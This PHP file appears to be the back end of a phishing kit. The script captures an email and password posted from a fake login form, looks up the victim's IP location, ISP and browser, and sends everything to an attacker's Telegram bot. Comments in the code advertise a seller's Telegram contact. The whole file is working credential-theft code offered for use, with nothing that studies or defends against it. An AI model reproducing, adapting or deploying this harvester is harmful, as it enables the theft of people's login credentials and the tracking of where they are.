<?php
// Holla on TG @Fast_0610

$telegram = [
    'bot_token' => '',
    'chat_id' => '',
];

function get_IP_address() {
    foreach (array(
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ) as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $IPaddress) {
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $IPaddress;
                }
            }
        }
    }
}

$ip_get = get_IP_address();
$apiUrl = "http://ipinfo.io/$ip_get/json";

$curl = curl_init($apiUrl);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($curl);

if ($response === false) {
    // Handle cURL error
    $ip = $ip_city = $ip_state = $ip_country = $ip_ISP = $ip_date = "No IP Response";
} else {
    $data = json_decode($response, true);

    if ($data === null) {
        // Handle JSON decoding error
        $ip = $ip_city = $ip_state = $ip_country = $ip_ISP = $ip_date = "No IP Response";
    } else {
        // Display IP info when there is an internet connection
        $ip = $data['ip'] ?? "Unknown";
        $ip_city = $data['city'] ?? "Unknown";
        $ip_state = $data['region'] ?? "Unknown";
        $ip_country = $data['country'] ?? "Unknown";
        $ip_ISP = $data['org'] ?? "Unknown";
        $ip_date = date('h:i:s A M-d-Y');
    }
}

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? "Unknown";

// If there is no internet connection, display a fallback message
if (!isset($ip)) {
    $ip = $ip_city = $ip_state = $ip_country = $ip_ISP = $ip_date = $user_agent = "No IP Response";
}
curl_close($curl);

function sendToTelegram($botToken, $chatId, $text) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $text
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

function getImageContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    // Optional: Set user agent
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP script)');
    $data = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200) {
        return false;
    }
    return $data;
}

function getDominantColor($imageUrl) {
    $imageData = getImageContents($imageUrl);
    if (!$imageData) return '#f0f0f0';

    $image = @imagecreatefromstring($imageData);
    if (!$image) return '#f0f0f0';

    $resized = imagecreatetruecolor(1, 1);
    imagecopyresampled($resized, $image, 0, 0, 0, 0, 1, 1, imagesx($image), imagesy($image));
    $rgb = imagecolorat($resized, 0, 0);
    imagedestroy($image);
    imagedestroy($resized);

    $r = ($rgb >> 16) & 0xFF;
    $g = ($rgb >> 8) & 0xFF;
    $b = $rgb & 0xFF;

    return sprintf("#%02x%02x%02x", $r, $g, $b);
}

if (isset($_POST['temail']) && isset($_POST['tpass'])) {
    $email = trim($_POST['temail'] ?? '');
    $password = trim($_POST['tpass'] ?? '');

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $date = date("m/d/Y");  // MM/DD/YYYY format

    $message  = "🔐 Login 4rm: $ip [$ip_country]\n\n";
    $message .= "Username: $email\n";
    $message .= "Password: $password\n\n";
    $message .= "IP: $ip\n";
    $message .= "City: $ip_city\n";
    $message .= "State: $ip_state\n";
    $message .= "Country: $ip_country\n";
    $message .= "ISP: $ip_ISP\n";
    $message .= "Time: $ip_date\n";
    $message .= "User-Agent: $user_agent\n";

    $responseText = sendToTelegram($telegram['bot_token'], $telegram['chat_id'], $message);
    $resText = json_decode($responseText, true);

    if (!$resText || !$resText['ok']) {
        exit("Message send failure");
    } else {
        exit("success");
    }
}

// Holla on TG @Fast_0610
?>
